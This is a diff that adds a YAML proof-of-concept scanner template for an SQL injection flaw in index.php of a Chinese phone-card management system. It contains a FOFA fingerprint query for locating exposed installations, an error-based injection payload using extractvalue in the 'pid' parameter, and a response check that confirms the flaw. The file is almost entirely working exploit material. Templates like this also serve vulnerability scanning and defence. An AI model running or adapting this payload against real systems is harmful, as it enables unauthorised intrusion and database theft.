@@ -1,0 +1,17 @@
+id: poc-yaml-haoka-jituan-index-php-sqli
+info:
+  name: 号卡极团管理系统 index.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 号卡极团管理系统
+  fofa: icon_hash="-795291075" && is_domain=false
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /order/index.php?pid=1%27%20AND%20(extractvalue(1,concat(0x7e,(select%20md5({{.t1}})),0x7e)));--%20htjf
+  expression: "status_code == 200 && \ncontains(body,\"XPATH syntax error\") &&\n\
+    contains(body,substr(t2,0,31)) &&\ncontains(body,\"SQL\")\n"
+transport: http
